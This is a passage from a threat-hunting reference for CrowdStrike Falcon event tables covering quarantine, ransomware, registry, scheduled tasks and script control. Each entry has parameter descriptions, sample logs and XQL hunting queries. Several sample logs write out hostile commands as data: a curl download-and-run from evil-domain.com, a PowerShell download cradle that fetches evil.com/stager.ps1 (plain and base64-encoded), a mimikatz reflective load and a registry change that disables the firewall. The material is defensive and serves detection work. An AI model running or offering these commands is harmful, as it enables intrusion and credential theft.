| QuarantinedFileState | A numeric code indicating the current state of the file, such as `1` (Quarantined), `2` (Released), or `3` (Deleted). | All |
| IsOnRemovableDisk | A boolean value that is true if the quarantined file was originally located on a removable disk. | All |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Users\\user\\Downloads\\malicious_payload.exe",
  "IsOnRemovableDisk": false,
  "QuarantinedFileName": "C:\\ProgramData\\Falcon\\Quarantine\\012345ab-cdef-6789-0123-456789abcdef.qf",
  "QuarantinedFileState": "1"
}
```

---

### 5. Example Queries

```xql
// Find all quarantined file state events
event_simpleName=QuarantinedFileState

// Hunt for files that have been released from quarantine, which could be a security risk
event_simpleName=QuarantinedFileState QuarantinedFileState=2

// Find the quarantine status for a specific file
event_simpleName=QuarantinedFileState ImageFileName="*\\mimikatz.exe"

// Find all quarantined files that originated from a removable disk
event_simpleName=QuarantinedFileState IsOnRemovableDisk=true

// Show the original path and the quarantine path for all currently quarantined files
event_simpleName=QuarantinedFileState QuarantinedFileState=1 | table ImageFileName, QuarantinedFileName
```
---
## RansomwareCreateFile Table: Ransomware File Creation Event

### 1. Table Name
**RansomwareCreateFile**

---

### 2. Table Usage
This event is generated when a process creates a file in a manner that is indicative of ransomware activity. This often occurs when ransomware drops a ransom note onto the system or creates the new, encrypted version of a victim's file. Monitoring this event is critical for detecting the active encryption phase of a ransomware attack.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the executable file of the process that created the file. | Windows Only |
| CommandLine | The command line used to launch the process that created the file. | Windows Only |
| TargetFileName | The full path to the file that was created by the suspected ransomware process. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Users\\Public\\crypt.exe",
  "CommandLine": "C:\\Users\\Public\\crypt.exe --goham",
  "TargetFileName": "C:\\Users\\user\\Documents\\DECRYPT_INSTRUCTIONS.txt"
}
```

---

### 5. Example Queries
```xql
// Find all ransomware file creation events
event_simpleName=RansomwareCreateFile

// Hunt for the creation of common ransom note file names
event_simpleName=RansomwareCreateFile TargetFileName="*DECRYPT*" OR TargetFileName="*RECOVER*" OR TargetFileName="*README*.txt"

// Find files created by a specific suspected ransomware process
event_simpleName=RansomwareCreateFile ImageFileName="*\\cryptolocker.exe"

// Investigate the command line used by processes that are creating ransomware-related files
event_simpleName=RansomwareCreateFile | table CommandLine, ImageFileName, TargetFileName
```
---
## RansomwareFileAccessPattern Table: Ransomware File Access Pattern Event

### 1. Table Name
**RansomwareFileAccessPattern**

---

### 2. Table Usage
This is a helper event for detecting ransomware file access patterns on Windows hosts. It is generated when a process accesses files in a way that is characteristic of ransomware, such as rapidly reading and then writing to or renaming a large number of files. This event is a strong indicator of an active ransomware attack.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the executable file of the process exhibiting ransomware-like behavior. | Windows Only |
| CommandLine | The command line used to launch the suspicious process. | Windows Only |
| SourceFileName | The original name of a file that was accessed by the process. | Windows Only |
| TargetFileName | The name of the file after being modified or renamed by the process. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Users\\Public\\cryptolocker.exe",
  "CommandLine": "C:\\Users\\Public\\cryptolocker.exe -encrypt",
  "SourceFileName": "C:\\Users\\jsmith\\Documents\\report.docx",
  "TargetFileName": "C:\\Users\\jsmith\\Documents\\report.docx.encrypted"
}
```
---

### 5. Example Queries
```xql
// Find all ransomware file access pattern events
event_simpleName=RansomwareFileAccessPattern

// Hunt for a specific process that is exhibiting ransomware behavior
event_simpleName=RansomwareFileAccessPattern ImageFileName="*\\wannacry.exe"

// Find instances where files with a specific original name are being targeted
event_simpleName=RansomwareFileAccessPattern SourceFileName="*financials.xlsx"

// Search for ransomware that renames files with a specific new extension
event_simpleName=RansomwareFileAccessPattern TargetFileName="*.locked"

// Investigate the command line used by processes flagged for ransomware-like file access
event_simpleName=RansomwareFileAccessPattern | table CommandLine, ImageFileName, SourceFileName, TargetFileName
```
---
## RansomwareOpenFile Table: Ransomware File Open Event

### 1. Table Name
**RansomwareOpenFile**

---

### 2. Table Usage
This event is generated when a file is opened in a manner that is indicative of ransomware activity. Ransomware needs to open files in order to read their content and encrypt them. This event is a critical indicator for detecting the active encryption phase of a ransomware attack.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The full path to the file that was opened by the suspected ransomware process. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Documents\\important_report.docx"
}
```

---
### 5. Example Queries
```xql
// Find all files opened by suspected ransomware processes
event_simpleName=RansomwareOpenFile

// Hunt for specific file types, like documents or spreadsheets, being opened by ransomware
event_simpleName=RansomwareOpenFile TargetFileName="*.docx" OR TargetFileName="*.xlsx"

// Find ransomware activity within a specific user's profile
event_simpleName=RansomwareOpenFile TargetFileName="C:\\Users\\jsmith\\*"
```
---
## RansomwareRenameFile Table: Ransomware File Rename Event

### 1. Table Name
**RansomwareRenameFile**

---

### 2. Table Usage
This event is generated when a file is renamed in a manner that is indicative of ransomware activity. Typically, ransomware encrypts files and then renames them, often by adding a specific extension. This event is critical for detecting the active encryption phase of a ransomware attack.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the process that performed the file rename. | Windows Only |
| CommandLine | The command line of the process that renamed the file. | Windows Only |
| SourceFileName | The original name of the file before it was renamed. | Windows Only |
| TargetFileName | The new name of the file after being renamed by the ransomware. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Users\\Public\\Documents\\evil.exe",
  "CommandLine": "C:\\Users\\Public\\Documents\\evil.exe -encrypt C:\\Users\\user\\Documents",
  "SourceFileName": "C:\\Users\\user\\Documents\\important_document.docx",
  "TargetFileName": "C:\\Users\\user\\Documents\\important_document.docx.locked"
}
```

---

### 5. Example Queries

```xql
// Find all ransomware file rename events
event_simpleName=RansomwareRenameFile

// Hunt for specific file extensions commonly used by ransomware
event_simpleName=RansomwareRenameFile TargetFileName="*.locked" OR TargetFileName="*.encrypted"

// Find what the original file name was for a renamed file
event_simpleName=RansomwareRenameFile TargetFileName="*report.docx.crypt*" | table SourceFileName

// Investigate which process is responsible for renaming files
event_simpleName=RansomwareRenameFile | stats count by ImageFileName

// Search for files being renamed by a process with a specific command line
event_simpleName=RansomwareRenameFile CommandLine="* -encrypt *"
```
---
## RarFileWritten Table: File Written Event

### 1. Table Name
**RarFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a RAR (Roshal Archive) file. Attackers frequently use RAR archives to compress and stage stolen data before exfiltration. Monitoring the creation of these files is useful for investigating data staging, potential data theft, and malware deployment.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive; otherwise, it is false. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | Windows Only |
| FileOperatorSid | The Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Documents\\secret_data.rar",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "secret_data.rar"
}
```

---

### 5. Example Queries

```xql
// Find all RAR files written to disk
event_simpleName=RarFileWritten TargetFileName="*.rar"

// Find RAR files written to a network drive (Windows only)
event_simpleName=RarFileWritten IsOnNetwork=true

// Find RAR files written to a removable disk (Windows only)
event_simpleName=RarFileWritten IsOnRemovableDisk=true

// Investigate RAR file writes by a specific file operator SID (Windows only)
event_simpleName=RarFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find RAR files based on their context base file name, which might indicate staging for exfiltration
event_simpleName=RarFileWritten ContextBaseFileName="*backup*.rar"
```
---
## RecentlyModifiedFileExecutedInContainer Table: Recently Modified File Execution Event

### 1. Table Name
**RecentlyModifiedFileExecutedInContainer**

---

### 2. Table Usage
This event is generated when a file that was recently created or modified inside a container is executed. This is a common attack pattern where an adversary drops a payload or script into a container and then immediately executes it. Monitoring this behavior is crucial for detecting container-based threats, such as cryptojacking, reverse shells, or other malicious activities.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the executable that was run (e.g., `/bin/bash`). | Linux, Falcon Container |
| CommandLine | The full command line used to execute the recently modified file. | Linux, Falcon Container |
| ParentImageFileName | The full path to the parent process that spawned the process which executed the file (e.g., `/usr/bin/curl`). | Linux, Falcon Container |
| ParentCommandLine | The command line of the parent process. | Linux, Falcon Container |
| TargetFileName | The path to the recently modified file that was executed. | Linux, Falcon Container |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "/bin/bash",
  "CommandLine": "/bin/bash /tmp/payload.sh",
  "ParentImageFileName": "/usr/bin/curl",
  "ParentCommandLine": "curl [http://evil-domain.com/payload.sh](http://evil-domain.com/payload.sh) -o /tmp/payload.sh",
  "TargetFileName": "/tmp/payload.sh"
}
```

---

### 5. Example Queries

```xql
// Find all instances of recently modified files being executed in containers
event_simpleName=RecentlyModifiedFileExecutedInContainer

// Hunt for scripts being executed from common temporary or writable directories
event_simpleName=RecentlyModifiedFileExecutedInContainer TargetFileName="/tmp/*" OR TargetFileName="/var/tmp/*"

// Find recently modified files that were executed by a shell
event_simpleName=RecentlyModifiedFileExecutedInContainer ImageFileName IN ("/bin/bash", "/bin/sh")

// Investigate what files are being executed immediately after being downloaded by curl or wget
event_simpleName=RecentlyModifiedFileExecutedInContainer ParentImageFileName IN ("/usr/bin/curl", "/usr/bin/wget")

// Look for specific suspicious file names being executed
event_simpleName=RecentlyModifiedFileExecutedInContainer TargetFileName="*payload*" OR TargetFileName="*shell*"
```
---
## ReflectiveDotnetModuleLoad Table: Reflective .NET Module Load Event

### 1. Table Name
**ReflectiveDotnetModuleLoad**

---

### 2. Table Usage
This event is generated when a .NET module is reflectively loaded into a process, for example, from a byte array in memory rather than from a file on disk. This is a common technique used by fileless malware and in-memory execution frameworks (like Cobalt Strike) to evade detection by traditional antivirus solutions. Monitoring this event is critical for identifying advanced in-memory threats.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the process in which the .NET module was reflectively loaded. | Windows Only |
| CommandLine | The command line of the process that loaded the module. | Windows Only |
| AssemblyName | The name of the assembly that was reflectively loaded. | Windows Only |
| ModuleILPath | The path to the Intermediate Language (IL) code of the loaded module, if available. | Windows Only |
| ModuleNativePath | The path to the native (Just-In-Time compiled) code of the loaded module, if available. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "CommandLine": "powershell -c [System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('C:\\Users\\Public\\mimikatz.dll'))",
  "AssemblyName": "mimikatz, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null",
  "ModuleILPath": "",
  "ModuleNativePath": ""
}
```

---

### 5. Example Queries

```xql
// Find all instances of reflective .NET module loading
event_simpleName=ReflectiveDotnetModuleLoad

// Hunt for reflective loading into PowerShell, a common technique for fileless attacks
event_simpleName=ReflectiveDotnetModuleLoad ImageFileName="*\\powershell.exe"

// Search for the loading of a specific suspicious assembly by name
event_simpleName=ReflectiveDotnetModuleLoad AssemblyName="*mimikatz*" OR AssemblyName="*PowerSploit*"

// Find instances where a process other than a known .NET host is reflectively loading modules
event_simpleName=ReflectiveDotnetModuleLoad ImageFileName!="C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe"

// Investigate reflective loading based on the command line arguments used
event_simpleName=ReflectiveDotnetModuleLoad CommandLine="*System.Reflection.Assembly*"
```
---
## RegCrowdstrikeValueUpdate Table: Crowdstrike Registry Value Update Event

### 1. Table Name
**RegCrowdstrikeValueUpdate**

---

### 2. Table Usage
This event is generated when a registry value related to the CrowdStrike sensor's configuration is updated on a Windows host. Monitoring these events is critical for detecting potential sensor tampering, misconfigurations, or attempts by adversaries to disable or bypass security controls.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| RegObjectName | The full path of the CrowdStrike-related registry key that was modified. | Windows Only |
| RegValueName | The name of the specific value within the key that was updated. | Windows Only |
| RegOperationType | The type of registry operation performed, such as `1` (Set Value) or `2` (Delete Value). | Windows Only |
| RegStringValue (if applicable) | The string data written to the registry value. This is populated when the value type is a string. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "RegObjectName": "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\CSAgent\\Sim",
  "RegValueName": "Trace",
  "RegOperationType": "1",
  "RegStringValue": "none"
}
```
---

### 5. Example Queries
```xql
// Find all updates to CrowdStrike-related registry values
event_simpleName=RegCrowdstrikeValueUpdate

// Hunt for modifications to specific CrowdStrike sensor configuration values
event_simpleName=RegCrowdstrikeValueUpdate RegValueName="ProvisioningToken"

// Find any deletions of CrowdStrike registry values
event_simpleName=RegCrowdstrikeValueUpdate RegOperationType=2

// Search for specific strings being written to CrowdStrike registry keys
event_simpleName=RegCrowdstrikeValueUpdate RegStringValue="*disabled*"
```
---
## RegGenericValueUpdate Table: Registry Value Update Event

### 1. Table Name
**RegGenericValueUpdate**

---

### 2. Table Usage
This event is generated when a registry value is updated on a Windows host. It serves as a general-purpose event for tracking registry modifications. Monitoring these updates is essential for threat hunting, as attackers frequently alter the registry to establish persistence, disable security features, store configuration data, or execute malicious code.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| RegObjectName | The full path of the registry key that was modified. | Windows Only |
| RegValueName | The name of the specific value within the key that was updated. | Windows Only |
| RegOperationType | The type of registry operation performed, such as `1` (Set Value) or `2` (Delete Value). | Windows Only |
| RegStringValue (if applicable) | The string data written to the registry value. This is populated when the value type is a string. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "RegObjectName": "\\REGISTRY\\USER\\S-1-5-21-12345\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  "RegValueName": "MaliciousUpdater",
  "RegOperationType": "1",
  "RegStringValue": "C:\\Users\\Public\\evil.exe"
}
```

---

### 5. Example Queries
```xql
// Find all generic registry value updates
event_simpleName=RegGenericValueUpdate

// Hunt for modifications to common persistence keys like Run or RunOnce
event_simpleName=RegGenericValueUpdate RegObjectName="*\\CurrentVersion\\Run*"

// Find instances where a specific registry value is being set or modified
event_simpleName=RegGenericValueUpdate RegValueName="*Backdoor*"

// Search for registry values being set to execute files from suspicious locations
event_simpleName=RegGenericValueUpdate RegStringValue="*\\Temp\\*" OR RegStringValue="*\\Users\\Public\\*"

// Filter for only "Set Value" operations
event_simpleName=RegGenericValueUpdate RegOperationType=1
```
---
## RegSystemConfigValueUpdate Table: System Registry Modification Event

### 1. Table Name
**RegSystemConfigValueUpdate**

---

### 2. Table Usage
This event is generated when a registry value related to system configuration or security is updated on a Windows host. Attackers often modify these registry values to disable security controls (like UAC or Windows Defender), establish persistence, or otherwise alter the system's behavior to their advantage. Monitoring these updates is crucial for detecting tampering and defense evasion techniques.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| RegObjectName | The full path of the registry key that was modified. | Windows Only |
| RegValueName | The name of the specific value within the key that was updated. | Windows Only |
| RegNumericValue/RegStringValue | The new data written to the registry value. This can be a number (`RegNumericValue`) or a string (`RegStringValue`). | Windows Only |
| RegOperationType | The type of registry operation performed, such as `1` (REG_SET_VALUE_KEY) or `2` (REG_DELETE_VALUE_KEY). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "RegObjectName": "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
  "RegValueName": "EnableFirewall",
  "RegNumericValue": "0",
  "RegOperationType": "1"
}
```

---

### 5. Example Queries
```xql
// Find all system configuration registry value updates
event_simpleName=RegSystemConfigValueUpdate

// Hunt for attempts to disable the Windows Firewall by modifying the EnableFirewall value
event_simpleName=RegSystemConfigValueUpdate RegValueName="EnableFirewall" RegNumericValue=0

// Find modifications to the LSA configuration, which could be related to credential protection
event_simpleName=RegSystemConfigValueUpdate RegObjectName="*\\Lsa"

// Search for changes to the UAC (User Account Control) settings
event_simpleName=RegSystemConfigValueUpdate RegValueName="EnableLUA"

// Filter for only "Set Value" operations on system configuration keys
event_simpleName=RegSystemConfigValueUpdate RegOperationType=1
```
---
## RegistryHiveFileWritten Table: Registry Hive Written Event

### 1. Table Name
**RegistryHiveFileWritten**

---

### 2. Table Usage
This event is generated when a Windows Registry hive file (such as SAM, SECURITY, or SYSTEM) is written to disk. This is a critical event to monitor for credential theft, as attackers often save these hives to extract password hashes and other sensitive system secrets for offline cracking.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The full path and file name where the registry hive was saved. | Windows Only |
| ContextBaseFileName | The base name of the file, which often indicates the specific hive being saved (e.g., SAM, SECURITY, SYSTEM). | Windows Only |
| UserName | The user account that performed the action of writing the hive file. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Windows\\Temp\\sam.save",
  "ContextBaseFileName": "SAM",
  "UserName": "NT AUTHORITY\\SYSTEM"
}
```
---
### 5. Example Queries

```xql
// Find all instances of registry hives being written to disk
event_simpleName=RegistryHiveFileWritten

// Hunt for the SAM hive being saved, which contains user password hashes
event_simpleName=RegistryHiveFileWritten ContextBaseFileName="SAM"

// Find registry hives being saved to suspicious locations like Temp or user directories
event_simpleName=RegistryHiveFileWritten TargetFileName="*\\Temp\\*" OR TargetFileName="*\\Users\\*"

// Search for instances where the SECURITY hive was written, which contains LSA secrets
event_simpleName=RegistryHiveFileWritten ContextBaseFileName="SECURITY"
```
---
## RpmFileWritten Table: File Written Event

### 1. Table Name
**RpmFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing an RPM (Red Hat Package Manager) file. RPM files are a standard way to install software on many Linux distributions. Attackers may create or write RPM files to disk as a method of deploying malware or other malicious tools. Monitoring these events is useful for tracking software installation and detecting potential malware drops.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "/tmp/malicious-package-1.0.rpm",
  "ContextBaseFileName": "malicious-package-1.0.rpm"
}
```

---
### 5. Example Queries

```xql
// Find all RPM files written to disk
event_simpleName=RpmFileWritten TargetFileName="*.rpm"

// Hunt for RPM files written to temporary directories, which is suspicious
event_simpleName=RpmFileWritten TargetFileName="/tmp/*.rpm" OR TargetFileName="/var/tmp/*.rpm"

// Find RPM files based on their context base file name
event_simpleName=RpmFileWritten ContextBaseFileName="*payload*.rpm"
```
---
## RtfFileWritten Table: File Written Event

### 1. Table Name
**RtfFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a Rich Text Format (RTF) file. Attackers have historically abused the RTF file format to embed malicious objects and exploits, often used in phishing campaigns to gain initial access. Monitoring the creation of RTF files is useful for investigating potential malware delivery and document-based attacks.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive; otherwise, it is false. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | Windows Only |
| FileOperatorSid | The Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Downloads\\Invoice.rtf",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "Invoice.rtf"
}
```
---
### 5. Example Queries

```xql
// Find all RTF files written to disk
event_simpleName=RtfFileWritten TargetFileName="*.rtf"

// Find RTF files written to a network drive (Windows only)
event_simpleName=RtfFileWritten IsOnNetwork=true

// Find RTF files written to a removable disk (Windows only)
event_simpleName=RtfFileWritten IsOnRemovableDisk=true

// Investigate RTF file writes by a specific file operator SID (Windows only)
event_simpleName=RtfFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find RTF files with a potentially suspicious name written to a download folder
event_simpleName=RtfFileWritten ContextBaseFileName="*invoice*.rtf" TargetFileName="*\\Downloads\\*"
```
---
## ScheduledTaskModified Table: Scheduled Task Modification Event

### 1. Table Name
**ScheduledTaskModified**

---

### 2. Table Usage
This event is generated when an existing scheduled task is modified on a Windows host. Attackers often hijack legitimate scheduled tasks to establish persistence or execute malicious code with the privileges of the original task. Monitoring these modifications is crucial for detecting attempts to abuse the Task Scheduler for malicious purposes.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TaskName | The name of the scheduled task that was modified. | Windows Only |
| TaskAuthor | The author of the scheduled task. | Windows Only |
| TaskExecCommand | The new command that the task is configured to execute after modification. | Windows Only |
| TaskXml | The full XML definition of the modified scheduled task, containing all new configuration details. | Windows Only |
| UserName | The user account that performed the modification of the task. | Windows Only |
| RpcClientProcessId | The Process ID (PID) of the process that made the RPC call to modify the task. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateAssistant",
  "TaskAuthor": "SYSTEM",
  "TaskExecCommand": "C:\\Windows\\Temp\\malicious.exe",
  "TaskXml": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.3\" xmlns=\"[http://schemas.microsoft.com/windows/2004/02/mit/task](http://schemas.microsoft.com/windows/2004/02/mit/task)\">...</Task>",
  "UserName": "CORP\\Admin",
  "RpcClientProcessId": "1234"
}
```

### 5. Example Queries
```xql
// Find all scheduled task modification events
event_simpleName=ScheduledTaskModified

// Hunt for legitimate tasks that have been modified to run executables from suspicious locations
event_simpleName=ScheduledTaskModified TaskExecCommand="*\\Temp\\*" OR TaskExecCommand="*\\Users\\Public\\*"

// Find tasks modified to execute PowerShell commands
event_simpleName=ScheduledTaskModified TaskExecCommand="*powershell.exe*"

// Investigate modifications made by a specific user
event_simpleName=ScheduledTaskModified UserName="*svc_account*"

// Search the raw Task XML for suspicious arguments or configurations
event_simpleName=ScheduledTaskModified TaskXml="*Invoke-Expression*" OR TaskXml="*DownloadString*"
```
---
## ScheduledTaskRegistered Table: Scheduled Task Creation Event

### 1. Table Name
**ScheduledTaskRegistered**

---

### 2. Table Usage
This event is generated when a new scheduled task is registered on a Windows host, either locally or remotely. Attackers frequently use scheduled tasks to establish persistence, run malicious code at specific times, or execute commands with elevated privileges. Monitoring this event is critical for detecting these persistence and execution techniques.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TaskName | The name of the scheduled task. | Windows Only |
| TaskAuthor | The author of the scheduled task. | Windows Only |
| TaskExecCommand | The command that the task is configured to execute. | Windows Only |
| TaskXml | The full XML definition of the scheduled task, which contains all configuration details. | Windows Only |
| UserName | The user account that registered the scheduled task. | Windows Only |
| RpcClientProcessId | The Process ID (PID) of the process that made the RPC call to register the task (e.g., the PID for `svchost.exe` hosting the Task Scheduler service). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TaskName": "\\Microsoft\\Windows\\EvilTask",
  "TaskAuthor": "CORP\\Admin",
  "TaskExecCommand": "C:\\Windows\\Temp\\payload.exe",
  "TaskXml": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.2\" xmlns=\"[http://schemas.microsoft.com/windows/2004/02/mit/task](http://schemas.microsoft.com/windows/2004/02/mit/task)\">...</Task>",
  "UserName": "CORP\\Admin",
  "RpcClientProcessId": "1234"
}
```

---
### 5. Example Queries
```xql
// Find all newly registered scheduled tasks
event_simpleName=ScheduledTaskRegistered

// Hunt for scheduled tasks that execute a command from a suspicious location
event_simpleName=ScheduledTaskRegistered TaskExecCommand="*\\Temp\\*" OR TaskExecCommand="*\\Users\\Public\\*"

// Find tasks created by a specific author
event_simpleName=ScheduledTaskRegistered TaskAuthor="*attacker*"

// Search for tasks that execute PowerShell commands
event_simpleName=ScheduledTaskRegistered TaskExecCommand="*powershell.exe*"

// Investigate the full XML for tasks that run with SYSTEM privileges
event_simpleName=ScheduledTaskRegistered TaskXml="*<UserId>S-1-5-18</UserId>*"
```
---
## ScreenshotTakenEtw Table: Screenshot Taken Event

### 1. Table Name
**ScreenshotTakenEtw**

---

### 2. Table Usage
This event is generated when a partial or full screenshot is taken on a Windows host. Malware and attackers often take screenshots to gather sensitive information from a user's desktop, such as passwords, personal data, or confidential documents. Monitoring this event is crucial for detecting reconnaissance and information theft activities.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the executable file that took the screenshot. | Windows Only |
| CommandLine | The command line used to launch the process that took the screenshot. | Windows Only |
| UserName | The name of the user who was active when the screenshot was taken. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\SnippingTool.exe",
  "CommandLine": "SnippingTool.exe",
  "UserName": "CORP\\jsmith"
}
```
---
### 5. Example Queries
```xql
// Find all screenshot events
event_simpleName=ScreenshotTakenEtw

// Find screenshots taken by a specific application
event_simpleName=ScreenshotTakenEtw ImageFileName="*\\SnippingTool.exe"

// Hunt for screenshots taken by processes running from unusual locations, like a Temp folder
event_simpleName=ScreenshotTakenEtw ImageFileName="*\\Temp\\*"

// Find screenshots taken by a specific user
event_simpleName=ScreenshotTakenEtw UserName="*admin*"

// Look for screenshots taken by suspicious or unknown processes
event_simpleName=ScreenshotTakenEtw ImageFileName!="C:\\Windows\\System32\\SnippingTool.exe"
```## ScriptControlBlocked Table: Script Execution Blocked Event

### 1. Table Name
**ScriptControlBlocked**

---

### 2. Table Usage
This event is sent when Falcon Host has blocked malicious script content from being executed on a Windows machine. This event provides the details of exactly what content was blocked, which is invaluable for understanding and investigating prevented attacks, especially those involving fileless malware or obfuscated commands.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the process hosting the script engine (e.g., `powershell.exe`, `wscript.exe`) whose execution was blocked. | Windows Only |
| ParentImageFileName | The full path to the parent process that spawned the script host. | Windows Only |
| CommandLine | The command line of the script host process that was blocked. | Windows Only |
| ScriptingLanguageId | An identifier for the scripting language that was blocked (e.g., PowerShell, VBScript, JScript). | Windows Only |
| ScriptContent | The full content of the script that was blocked from executing. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "ParentImageFileName": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwB0AGEAZwBlAHIALgBwAHMAMQAnACkA",
  "ScriptingLanguageId": "1",
  "ScriptContent": "IEX(New-Object Net.WebClient).DownloadString('[http://evil.com/stager.ps1](http://evil.com/stager.ps1)')"
}
```
---

### 5. Example Queries
```xql
// Find all script control block events
event_simpleName=ScriptControlBlocked

// Find all blocked PowerShell scripts
event_simpleName=ScriptControlBlocked ImageFileName="*\\powershell.exe"

// Hunt for scripts blocked from executing out of a specific parent process, like an Office application
event_simpleName=ScriptControlBlocked ParentImageFileName IN ("*\\winword.exe", "*\\excel.exe")

// Search for specific suspicious commands within blocked script content
event_simpleName=ScriptControlBlocked ScriptContent="*DownloadString*" OR ScriptContent="*Invoke-Mimikatz*"

// Find blocked VBScripts or JScripts
event_simpleName=ScriptControlBlocked ScriptingLanguageId IN (4, 5)
```
---
## ScriptControlDetectInfo Table: Malicious Script Execution Event

### 1. Table Name
**ScriptControlDetectInfo**

---

### 2. Table Usage
This event is sent when Falcon has detected malicious script content being executed on the host. This event provides the details of exactly what content was detected, which is invaluable for investigating fileless malware, obfuscated commands, and other in-memory threats.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the process hosting the script engine (e.g., `powershell.exe`, `wscript.exe`). | All |
| ParentImageFileName | The full path to the parent process that spawned the script host. | All |
| CommandLine | The command line of the script host process. | All |
| HostProcessType | The type of process hosting the script engine. | Windows Only |
| ScriptingLanguageId | An identifier for the scripting language being used (e.g., PowerShell, VBScript, JScript). | Windows Only |
| ScriptContentSource | The source of the script content (e.g., from the command line, a file, or interactive session). | Windows, Linux |
| ScriptContent | The full content of the script that was detected as malicious. | Windows, Linux |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "ParentImageFileName": "C:\\Windows\\System32\\cmd.exe",
  "CommandLine": "powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwB0AGEAZwBlAHIALgBwAHMAMQAnACkA",
  "HostProcessType": "1",
  "ScriptingLanguageId": "1",
